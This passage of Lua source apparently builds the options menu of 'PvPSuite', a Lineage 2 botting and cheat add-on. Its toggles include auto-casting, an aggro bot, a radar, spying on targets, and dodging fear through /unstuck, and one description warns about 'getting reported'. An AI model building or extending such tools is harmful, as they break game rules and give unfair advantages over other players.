	elseif (param == "Enhances") then
			Condition = false;
			if ((PvPSuite[61])) then
				Condition = true;
			end;
			html:AddHtml("</br ></br >");
			html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=236><tr><td align=left valign=top width=236>');
			html:AddButton(THtmlAction("/doaction"):AddParam("Auto SS(S-Grade)"),THtmlButtonStyle.BUTTON_EXTRA, "Auto SS(S-Grade)",Condition,"","",150,25);
			html:AddHtml('</td><td align=right valign=top width=200><img src="'..GetItemIcon(1467)..'" height=32 width=32></br ></td></tr></table>');
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=271><tr><td align=left valign=top width=236>");
				html:AddHtml("Automatically enables S-Grade soulshots and spiritshots!");
				html:AddHtml("</td></tr></table>");
			end;
			Condition = false;
			if ((PvPSuite[5])) then
				Condition = true;
			end;
			html:AddHtml("</br ></br >");
			html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=236><tr><td align=left valign=top width=236>');
			html:AddButton(THtmlAction("/doaction"):AddParam("Barrier Fix"),THtmlButtonStyle.BUTTON_EXTRA, "Barrier Fix",Condition,"","",150,25);
			html:AddHtml('</td><td align=right valign=top width=200><img src="'..GetSkillIcon(1418)..'" height=32 width=32></br ></td></tr></table>');
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=267><tr><td align=left valign=top width=236>");
				html:AddHtml("Tower will be paused while you're on barrier skills and resumed while barrier goes off, to avoid cancelling barrier.");
				html:AddHtml("</td></tr></table>");
			end;
			Condition = false;
			if ((PvPSuite[6])) then
				Condition = true;
			end;
			html:AddHtml("</br ></br >");
			html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=236><tr><td align=left valign=top width=236>');
			html:AddButton(THtmlAction("/doaction"):AddParam("Don't Run(Fear Skills)"),THtmlButtonStyle.BUTTON_EXTRA, "Don't Run From Fear",Condition,"","",150,25);
			html:AddHtml('</td><td align=right valign=top width=200><img src="'..GetSkillIcon(1169)..'" height=32 width=32></br ></td></tr></table>');
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=270><tr><td align=left valign=top width=236>");
				html:AddHtml("Your character won't run while on fear skills, using /unstuck method.");
				html:AddHtml("</td></tr></table>");
			end;
			Condition = false;
			if ((PvPSuite[16]) and (iHaveAoE())) then
				Condition = true;
			end;
			html:AddHtml("</br ></br >");
			Style = THtmlButtonStyle.BUTTON_NO_CLICK;
			local AoEID = 922;
			if (iHaveAoE()) then
				Style = THtmlButtonStyle.BUTTON_EXTRA;
				AoEID = getAoE();
			end;
			html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=236><tr><td align=left valign=top width=236>');
			html:AddButton(THtmlAction("/doaction"):AddParam("Auto Detection(AoE)"),Style, "Auto Detection(AoE)",Condition,"","",150,25);
			html:AddHtml('</td><td align=right valign=top width=200><img src="'..GetSkillIcon(AoEID)..'" height=32 width=32></br ></td></tr></table>');
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=264><tr><td align=left valign=top width=236>");
				html:AddHtml("If you enable this and a character within 600 range cast hide, you'll cast automatically an AoE skill to reveal hide. Its really fast, so be aware of getting reported! Icon represents your AoE skill(if there is one)");
				html:AddHtml("</td></tr></table>");
			end;
			Condition = false;
			if ((PvPSuite[18]) and (iHaveIRh())) then
				Condition = true;
			end;
			Style = THtmlButtonStyle.BUTTON_NO_CLICK;
			if (iHaveIRh()) then
				Style = THtmlButtonStyle.BUTTON_EXTRA;
			end;
			html:AddHtml("</br ></br >");
			html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=236><tr><td align=left valign=top width=236>');
			html:AddButton(THtmlAction("/doaction"):AddParam("Interrupt Elemental Heal"),Style, "Interrupt E. Heal",Condition,"","",150,25);
			html:AddHtml('</td><td align=right valign=top width=200><img src="'..GetSkillIcon(58)..'" height=32 width=32></br ></td></tr></table>');
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=267><tr><td align=left valign=top width=236>");
				html:AddHtml("If your target will cast Elemental Heal, your character will use a target cancelling skill to interrupt the heal.");
				html:AddHtml("</td></tr></table>");
			end;
			Condition = false;
			if ((PvPSuite[30]) and (iHaveSkill(340))) then
				Condition = true;
			end;
			Style = THtmlButtonStyle.BUTTON_NO_CLICK;
			if (iHaveSkill(340)) then
				Style = THtmlButtonStyle.BUTTON_EXTRA;
			end;
			html:AddHtml("</br ></br >");
			html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=234><tr><td align=left valign=top width=236>');
			html:AddButton(THtmlAction("/doaction"):AddParam("Auto Riposte Stance"),Style, "Auto Riposte Stance",Condition,"","",150,25);
			html:AddHtml('</td><td align=right valign=top width=200><img src="'..GetSkillIcon(340)..'" height=32 width=32></br ></td></tr></table>');
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=263><tr><td align=left valign=top width=236>");
				html:AddHtml("Automatically activates Riposte Stance when an enemy will cast a various debuff(checks 50+ debuffs) on you, deactivates Riposte Stance when the debuff is casted. Contact me for any various debuff missing.");
				html:AddHtml("</td></tr></table>");
			end;
			Condition = false;
			if ((PvPSuite[31]) and (iHaveCleanse())) then
				Condition = true;
			end;
			Style = THtmlButtonStyle.BUTTON_NO_CLICK;
			if (iHaveCleanse()) then
				Style = THtmlButtonStyle.BUTTON_EXTRA;
			end;
			html:AddHtml("</br ></br >");
			html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=236><tr><td align=left valign=top width=236>');
			html:AddButton(THtmlAction("/doaction"):AddParam("Auto Self Cleanse"),Style, "Auto Self Cleanse",Condition,"","",150,25);
			html:AddHtml('</td><td align=right valign=top width=200><img src="'..GetSkillIcon(1409)..'" height=32 width=32></br ></td></tr></table>');
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=270><tr><td align=left valign=top width=236>");
				html:AddHtml("Automatically cleanses yourself once a debuff is found upon you!");
				html:AddHtml("</td></tr></table>");
			end;
			Condition = false;
			if ((PvPSuite[64]) and ((iHaveSkill(1016)) and (iHaveSkill(1254)))) then
				Condition = true;
			end;
			Style = THtmlButtonStyle.BUTTON_NO_CLICK;
			if ((iHaveSkill(1016)) and (iHaveSkill(1254))) then
				Style = THtmlButtonStyle.BUTTON_EXTRA;
			end;
			html:AddHtml("</br ></br >");
			html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=236><tr><td align=left valign=top width=236>');
			html:AddButton(THtmlAction("/doaction"):AddParam("Auto PT Resurrection"),Style, "Auto PT Resurrection",Condition,"","",150,25);
			html:AddHtml('</td><td align=right valign=top width=200><img src="'..GetSkillIcon(1016)..'" height=32 width=32></br ></td></tr></table>');
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=268><tr><td align=left valign=top width=236>");
				html:AddHtml("Automatically uses resurrection and mass resurrection on your dead party members!");
				html:AddHtml("</td></tr></table>");
			end;
			Condition = false;
			if ((PvPSuite[32]) and (iHaveAggroSk())) then
				Condition = true;
			end;
			Style = THtmlButtonStyle.BUTTON_NO_CLICK;
			if (iHaveAggroSk()) then
				Style = THtmlButtonStyle.BUTTON_EXTRA;
			end;
			html:AddHtml("</br ></br >");
			html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=236><tr><td align=left valign=top width=236>');
			html:AddButton(THtmlAction("/doaction"):AddParam("Aggro Bot"),Style, "Aggro Bot",Condition,"","",150,25);
			html:AddHtml('</td><td align=right valign=top width=200><img src="'..GetSkillIcon(28)..'" height=32 width=32></br ></td></tr></table>');
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=269><tr><td align=left valign=top width=236>");
				html:AddHtml("Continuously uses Aggresion on the targeted enemy! Quick Command: /ab");
				html:AddHtml("</td></tr></table>");
			end;
	elseif (param == "Informers") then
			Condition = false;
			if ((PvPSuite[7])) then
				Condition = true;
			end;
			html:AddHtml("</br ></br >");
			html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=140><tr><td align=left valign=top width=236>');
			html:AddButton(THtmlAction("/doaction"):AddParam("Informer(Skills)"),THtmlButtonStyle.BUTTON_EXTRA, "Informer(Skills)",Condition,"","",170,25);
			html:AddHtml('</td><td align=right valign=top width=200><img src="'..GetSkillIcon(1532)..'" height=32 width=32></br ></td></tr></table>');
			if (PvPSuite[17]) then 
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=244><tr><td align=left valign=top width=236>");
				html:AddHtml("You'll be informed while your target casts various skills like Enlightenment, Ultimate Evasion, UDs and more!");
				html:AddHtml("</td></tr></table>");
			end;
			Condition = false;
			if ((PvPSuite[8])) then
				Condition = true;
			end;
			html:AddHtml("</br ></br >");
			html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=140><tr><td align=left valign=top width=236>');
			html:AddButton(THtmlAction("/doaction"):AddParam("Informer(Chance/Cert)"),THtmlButtonStyle.BUTTON_EXTRA, "Informer(Chance/Cert)",Condition,"","",170,25);
			html:AddHtml('</td><td align=right valign=top width=200><img src="'..GetSkillIcon(533)..'" height=32 width=32></br ></td></tr></table>');
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=247><tr><td align=left valign=top width=236>");
				html:AddHtml("You'll be informed while chance/cert skill are triggered to your target!");
				html:AddHtml("</td></tr></table>");
			end;
			Condition = false;
			if ((PvPSuite[9])) then
				Condition = true;
			end;
			html:AddHtml("</br ></br >");
			html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=140><tr><td align=left valign=top width=236>');
			html:AddButton(THtmlAction("/doaction"):AddParam("Informer(Buffs)"),THtmlButtonStyle.BUTTON_EXTRA, "Informer(Buffs)",Condition,"","",170,25);
			html:AddHtml('</td><td align=right valign=top width=200><img src="'..GetSkillIcon(788)..'" height=32 width=32></br ></td></tr></table>');
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=246><tr><td align=left valign=top width=236>");
				html:AddHtml("You'll be informed while your target casts buff skills (like Appetite, SOS, Flame, etc..)!");
				html:AddHtml("</td></tr></table>");
			end;
			Condition = false;
			if ((PvPSuite[35])) then
				Condition = true;
			end;
			html:AddHtml("</br ></br >");
			html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=140><tr><td align=left valign=top width=236>');
			html:AddButton(THtmlAction("/doaction"):AddParam("Informer(Augments)"),THtmlButtonStyle.BUTTON_EXTRA, "Informer(Augments)",Condition,"","",170,25);
			html:AddHtml('</td><td align=right valign=top width=200><img src="icon.skill3080" height=32 width=32></br ></td></tr></table>');
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=248><tr><td align=left valign=top width=236>");
				html:AddHtml("You'll be informed while your target casts Augments skills!");
				html:AddHtml("</td></tr></table>");
			end;
			Condition = false;
			if ((PvPSuite[62])) then
				Condition = true;
			end;
			html:AddHtml("</br ></br >");
			html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=140><tr><td align=left valign=top width=236>');
			html:AddButton(THtmlAction("/doaction"):AddParam("Mass Informer"),THtmlButtonStyle.BUTTON_EXTRA, "Mass Informer",Condition,"","",170,25);
			html:AddHtml('</td><td align=right valign=top width=200><img src="'..GetSkillIcon(534)..'" height=32 width=32></br ></td></tr></table>');
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=244><tr><td align=left valign=top width=236>");
				html:AddHtml("You'll be informed while your target and his/her clan/ally members(in a fixed range) cast various skills and buffs!");
				html:AddHtml("</td></tr></table>");
			end;
			Condition = false;
			if ((PvPSuite[63])) then
				Condition = true;
			end;
			html:AddHtml("</br ></br >");
			html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=140><tr><td align=left valign=top width=236>');
			html:AddButton(THtmlAction("/doaction"):AddParam("All Informers"),THtmlButtonStyle.BUTTON_EXTRA, "All Informers",Condition,"","",170,25);
			html:AddHtml('</td><td align=right valign=top width=200><img src="'..GetSkillIcon(531)..'" height=32 width=32></br ></td></tr></table>');
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=252><tr><td align=left valign=top width=236>");
				html:AddHtml("All informers together without any check.");
				html:AddHtml("</td></tr></table>");
			end;
	elseif (param == "Party Informers") then
			Condition = false;
			if ((PvPSuite[10])) then
				Condition = true;
			end;
			html:AddHtml("</br ></br >");
			html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=140><tr><td align=left valign=top width=236>');
			html:AddButton(THtmlAction("/doaction"):AddParam("Party Informer(Skills)"),THtmlButtonStyle.BUTTON_EXTRA, "Party Informer(Skills)",Condition,"","",190,25);
			html:AddHtml('</td><td align=right valign=top width=200><img src="'..GetSkillIcon(1532)..'" height=32 width=32></br ></td></tr></table>');
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=263><tr><td align=left valign=top width=236>");
				html:AddHtml("Inform your party members(#) while your target casts various skills like Enlightenment, Ultimate Evasion, UDs and more! Be aware that this can be spammy most of the times.");
				html:AddHtml("</td></tr></table>");
			end;
			Condition = false;
			if ((PvPSuite[11])) then
				Condition = true;
			end;
			html:AddHtml("</br ></br >");
			html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=140><tr><td align=left valign=top width=236>');
			html:AddButton(THtmlAction("/doaction"):AddParam("Party  Informer(Chance/Cert)"),THtmlButtonStyle.BUTTON_EXTRA, "Party  Informer(Chance/Cert)",Condition,"","",190,25);
			html:AddHtml('</td><td align=right valign=top width=200><img src="'..GetSkillIcon(533)..'" height=32 width=32></br ></td></tr></table>');
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=264><tr><td align=left valign=top width=236>");
				html:AddHtml("Inform your party members(#) while chance/cert skill are triggered to your target! Be aware that this can be spammy most of the times.");
				html:AddHtml("</td></tr></table>");
			end;
			Condition = false;
			if ((PvPSuite[12])) then
				Condition = true;
			end;
			html:AddHtml("</br ></br >");
			html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=140><tr><td align=left valign=top width=236>');
			html:AddButton(THtmlAction("/doaction"):AddParam("Party  Informer(Buffs)"),THtmlButtonStyle.BUTTON_EXTRA, "Party  Informer(Buffs)",Condition,"","",190,25);
			html:AddHtml('</td><td align=right valign=top width=200><img src="'..GetSkillIcon(788)..'" height=32 width=32></br ></td></tr></table>');
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=264><tr><td align=left valign=top width=236>");
				html:AddHtml("Inform your party members(#) while your target casts buff skills (like SOS, Flame(and their levels), Appetite etc..)!");
				html:AddHtml("</td></tr></table>");
			end;
			Condition = false;
			if ((PvPSuite[36])) then
				Condition = true;
			end;
			html:AddHtml("</br ></br >");
			html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=140><tr><td align=left valign=top width=236>');
			html:AddButton(THtmlAction("/doaction"):AddParam("Party  Informer(Augments)"),THtmlButtonStyle.BUTTON_EXTRA, "Party  Informer(Augments)",Condition,"","",190,25);
			html:AddHtml('</td><td align=right valign=top width=200><img src="icon.skill3080" height=32 width=32></br ></td></tr></table>');
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=267><tr><td align=left valign=top width=236>");
				html:AddHtml("Inform your party members(#) while your target casts Augments skills!");
				html:AddHtml("</td></tr></table>");
			end;
	elseif (param == "A Better Assist") then
			Condition = false;
			if ((PvPSuite[13])) then
				Condition = true;
			end;
			html:AddHtml("</br ></br >");
			html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=244><tr><td align=left valign=top width=236>');
			html:AddButton(THtmlAction("/doaction"):AddParam("Auto Assist"),THtmlButtonStyle.BUTTON_EXTRA, "Auto Assist",Condition,"","",120,25);
			html:AddHtml('</td><td align=right valign=top width=200><img src="icon.action010" height=32 width=32></br ></td></tr></table>');
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=244><tr><td align=left valign=top width=236>");
				html:AddHtml("A Better Assist system to Auto Assist a main assister, fast and reliable, won't assist on aggro, will cancel target when MA does. Quick Command: /as");
				html:AddHtml("</td></tr></table>");
			end;
			html:AddHtml("</br >");
			html:AddHtml("</br >");
			html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=244><tr><td align=left valign=top width=236>");
			html:AddButton(THtmlAction("/doaction"):AddParam("Set MA"),THtmlButtonStyle.BUTTON_ACTION, "Set MA",false,"","",120,25);
			html:AddHtml('</td><td align=right valign=top width=200><img src="icon.action014" height=32 width=32></br ></td></tr></table>');
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=246><tr><td align=left valign=top width=236>");
				html:AddHtml("Target the main assister and press this button to set Auto Assist. Quick Command: /setma");
				html:AddHtml("</td></tr></table>");
			end;
			if (PvPSuite[25] ~= "") then
				html:AddHtml("</br ></br >");
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=244><tr><td align=left valign=top width=236>");
				html:AddHtml('<font color="FF0000">MA: '..PvPSuite[25]..'</font>');
				html:AddHtml('</td><td align=right valign=top width=200>');
				html:AddButton(THtmlAction("/doaction"):AddParam("Clear MA"),THtmlButtonStyle.BUTTON_ACTION, "Clear MA",false,"","",100,25);
				html:AddHtml('</br ></td></tr></table>');
				if (PvPSuite[17]) then
					html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=253><tr><td align=left valign=top width=236>");
					html:AddHtml("Click this button to clear the main assister!");
					html:AddHtml("</td></tr></table>");
				end;
			end;
	elseif (param == "Main Assister") then
			Condition = false;
			if ((PvPSuite[14])) then
				Condition = true;
			end;
			html:AddHtml("</br ></br >");
			html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=140><tr><td align=left valign=top width=236>');
			html:AddButton(THtmlAction("/doaction"):AddParam("Informer(Not Assisting)"),THtmlButtonStyle.BUTTON_EXTRA, "Informer(Not Assisting)",Condition,"","",170,25);
			html:AddHtml('</td><td align=right valign=top width=200><img src="'..GetSkillIcon(946)..'" height=32 width=32></br ></td></tr></table>');
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=243><tr><td align=left valign=top width=236>");
				html:AddHtml("You'll be informed with who is not assisting you when your target changes and stays there for 3 seconds. Excluded support classes.");
				html:AddHtml("</td></tr></table>");
			end;
			Condition = false;
			if ((PvPSuite[15])) then
				Condition = true;
			end;
			html:AddHtml("</br ></br >");
			html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=140><tr><td align=left valign=top width=236>');
			html:AddButton(THtmlAction("/doaction"):AddParam("Informer(Regroup)"),THtmlButtonStyle.BUTTON_EXTRA, "Informer(Regroup)",Condition,"","",170,25);
			html:AddHtml('</td><td align=right valign=top width=200><img src="'..GetSkillIcon(4109)..'" height=32 width=32></br ></td></tr></table>');
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=245><tr><td align=left valign=top width=236>");
				html:AddHtml("You'll be informed with who is away from you when your target changes and stays there for 3 seconds.");
				html:AddHtml("</td></tr></table>");
			end;
			html:AddHtml("</br ></br >");
			html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=140><tr><td align=left valign=top width=236>');
			html:AddButton(THtmlAction("/doaction"):AddParam("Near Supporters"),THtmlButtonStyle.BUTTON_ACTION, "Near Supporters",false,"","",170,25);
			html:AddHtml('</td><td align=right valign=top width=200><img src="'..GetSkillIcon(45)..'" height=32 width=32></br ></td></tr></table>');
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=244><tr><td align=left valign=top width=236>");
				html:AddHtml('Get a list with near(1500 range) support classes(Cardinal, Judicator, Dominator) click to target. Quick Command: /ns');
				html:AddHtml("</td></tr></table>");
			end;
	elseif (param == "Olympiad") then
			Condition = false;
			if (PvPSuite[44]) then
				Condition = true;
			end;
			html:AddHtml("</br ></br >");
			html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=186><tr><td align=left valign=top width=236>');
			html:AddButton(THtmlAction("/doaction"):AddParam("Inform Name/Clan/Class"),THtmlButtonStyle.BUTTON_EXTRA, "Inform Name/Clan/Class",Condition,"","",150,25);
			html:AddHtml('</td><td align=right valign=top width=200><img src="'..GetSkillIcon(766)..'" height=32 width=32></br ></td></tr></table>');
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=242><tr><td align=left valign=top width=236>");
				html:AddHtml("You'll be informed(PM style) when you'll join olympiad about your opponent's name, clan(if any) and class! Be aware that this feature may not be accurate 100% of the time.");
				html:AddHtml("</td></tr></table>");
			end;
			Condition = false;
			if (PvPSuite[39]) then
				Condition = true;
			end;
			html:AddHtml("</br ></br >");
			html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=186><tr><td align=left valign=top width=236>');
			html:AddButton(THtmlAction("/doaction"):AddParam("Olympiad Informer"),THtmlButtonStyle.BUTTON_EXTRA, "Olympiad Informer",Condition,"","",150,25);
			html:AddHtml('</td><td align=right valign=top width=200><img src="'..GetSkillIcon(832)..'" height=32 width=32></br ></td></tr></table>');
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=243><tr><td align=left valign=top width=236>");
				html:AddHtml("You'll be informed when any near player{big range) casts various skills. Should be used only inside Olympiad. Quick Command: /oi");
				html:AddHtml("</td></tr></table>");
			end;
			Condition = false;
			if ((PvPSuite[38]) and (iHaveIRh())) then
				Condition = true;
			end;
			Style = THtmlButtonStyle.BUTTON_NO_CLICK;
			if (iHaveIRh()) then
				Style = THtmlButtonStyle.BUTTON_EXTRA;
			end;
			html:AddHtml("</br ></br >");
			html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=186><tr><td align=left valign=top width=236>');
			html:AddButton(THtmlAction("/doaction"):AddParam("Interrupt Talismans"),Style, "Interrupt Talismans",Condition,"","",150,25);
			html:AddHtml('</td><td align=right valign=top width=200><img src="icon.etc_talisman_i01" height=32 width=32></br ></td></tr></table>');
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=244><tr><td align=left valign=top width=236>");
				html:AddHtml("If your target will cast any various talisman skills, your character will use a target cancelling skill to interrupt them.");
				html:AddHtml("</td></tr></table>");
			end;
			html:AddHtml("</br ></br >");
			html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=140><tr><td align=left valign=top width=236>');
			html:AddButton(THtmlAction("/doaction"):AddParam("Near Players"),THtmlButtonStyle.BUTTON_ACTION, "Near Players",false,"","",170,25);
			html:AddHtml('</td><td align=right valign=top width=200><img src="'..GetSkillIcon(4107)..'" height=32 width=32></br ></td></tr></table>');
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=243><tr><td align=left valign=top width=236>");
				html:AddHtml('Get a list with near players(may be useful for other uses too) and check VS who you are and what class he/she is, click to target.  Quick Command: /np');
				html:AddHtml("</td></tr></table>");
			end;
			html:AddHtml("</br ></br >");
			html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=140><tr><td align=left valign=top width=236>');
			html:AddButton(THtmlAction("/doaction"):AddParam("Damage Counter"),THtmlButtonStyle.BUTTON_ACTION, "Damage Counter",false,"","",170,25);
			html:AddHtml('</td><td align=right valign=top width=200><img src="'..GetSkillIcon(1527)..'" height=32 width=32></br ></td></tr></table>');
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=241><tr><td align=left valign=top width=236>");
				html:AddHtml('Get a dialog with done and received damage and options to get auto-informed about it! Should work on official systems and on most of the custom systems too! Safest option is "Show PM Each Minute", otherwise you could get camera stuck. Quick Command: /dc');
				html:AddHtml("</td></tr></table>");
			end;
	elseif (param == "Spy") then
			Condition = false;
			if (PvPSuite[43]) then
				Condition = true;
			end;
			html:AddHtml("</br ></br >");
			html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=140><tr><td align=left valign=top width=236>');
			html:AddButton(THtmlAction("/doaction"):AddParam("Class On Title"),THtmlButtonStyle.BUTTON_EXTRA, "Class On Title",Condition,"","",170,25);
			html:AddHtml('</td><td align=right valign=top width=200><img src="'..GetSkillIcon(248)..'" height=32 width=32></br ></td></tr></table>');
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=243><tr><td align=left valign=top width=236>");
				html:AddHtml("Enable this option and everyone's title will be set to their class. Restart or unstuck to take effect. You must have DISABLED 'Title Target Change'(//cfg -> PVP Target)!");
				html:AddHtml("</td></tr></table>");
			end;
			html:AddHtml("</br ></br >");
			Condition = false;
			if (PvPSuite[19]) then
				Condition = true;
			end;
			html:AddHtml("</br ></br >");
			html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=140><tr><td align=left valign=top width=236>');
			html:AddButton(THtmlAction("/doaction"):AddParam("Target Teleport"),THtmlButtonStyle.BUTTON_EXTRA, "Target Teleport",Condition,"","",170,25);
			html:AddHtml('</td><td align=right valign=top width=200><img src="icon.action009" height=32 width=32></br ></td></tr></table>');
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=246><tr><td align=left valign=top width=236>");
				html:AddHtml('If your target will teleport, you will get a message of where he/she teleported.');
				html:AddHtml("</td></tr></table>");
			end;
			html:AddHtml("</br ></br >");
			html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=244><tr><td align=left valign=top width=236>');
			html:AddButton(THtmlAction("/doaction"):AddParam("Radar"),THtmlButtonStyle.BUTTON_ACTION, "Radar",false,"","",100,35);
			html:AddHtml('</td><td align=right valign=top width=200><img src="'..GetSkillIcon(502)..'" height=32 width=32></br ></td></tr></table>');
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=244><tr><td align=left valign=top width=236>");
				html:AddHtml('A colorful radar to show you near players in a range of 1500, click "i" to get more info about player and ">" to target. Quick Command: /r');
				html:AddHtml("</td></tr></table>");
			end;
			html:AddHtml("</br ></br >");
			html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=140<tr><td align=left valign=top width=236>');
			html:AddButton(THtmlAction("/doaction"):AddParam("Radar(PK/War/PvP Only)"),THtmlButtonStyle.BUTTON_ACTION, "Radar(PK/War/PvP Only)",false,"","",170,35);
			html:AddHtml('</td><td align=right valign=top width=200><img src="'..GetSkillIcon(503)..'" height=32 width=32></br ></td></tr></table>');
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=243><tr><td align=left valign=top width=236>");
				html:AddHtml('A colorful radar to show you near PK/War/PvP players in a range of 3500, click "i" to get more info about player and ">" to target. Quick Command: /rp');
				html:AddHtml("</td></tr></table>");
			end;
			html:AddHtml("</br ></br >");
			html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=140><tr><td align=left valign=top width=236>');
			html:AddButton(THtmlAction("/doaction"):AddParam("Target Equipment"),THtmlButtonStyle.BUTTON_ACTION, "Target Equipment",false,"","",170,25);
			html:AddHtml('</td><td align=right valign=top width=200><img src="icon.armor_helmet_i00" height=32 width=32></br ></td></tr></table>');
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=246><tr><td align=left valign=top width=236>");
				html:AddHtml('Get information about the items your target wears! From armor parts to talismans!');
				html:AddHtml("</td></tr></table>");
			end;
			html:AddHtml("</br ></br >");
			html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=140><tr><td align=left valign=top width=236>');
			html:AddButton(THtmlAction("/doaction"):AddParam("Last 10 Targeters"),THtmlButtonStyle.BUTTON_ACTION, "Last 10 Targeters",false,"","",170,25);
			html:AddHtml('</td><td align=right valign=top width=200><img src="icon.action006" height=32 width=32></br ></td></tr></table>');
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=244><tr><td align=left valign=top width=236>");
				html:AddHtml('Get a list with the last 10 players who targeted you(not including friends/clan/ally members) and when.');
				html:AddHtml("</td></tr></table>");
			end;
	elseif (param == "Other") then
			html:AddHtml("</br ></br >");
			if (TTT[1]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=267><tr><td align=center valign=top width=236>");
				html:AddHtml('<font color="D51E87">A Tic Tac Toe game is active!</font>');
				html:AddButton(THtmlAction("/dogame"):AddParam("TicTacToeContinue"),THtmlButtonStyle.BUTTON_ACTION, "Continue Game",false,"","",170,25);
				html:AddButton(THtmlAction("/dogame"):AddParam("TicTacToeEDF"),THtmlButtonStyle.BUTTON_ACTION,"End Game",false,"","",170,25);
				html:AddHtml("</td></tr></table>");
				html:AddHtml('</br >');
			end;
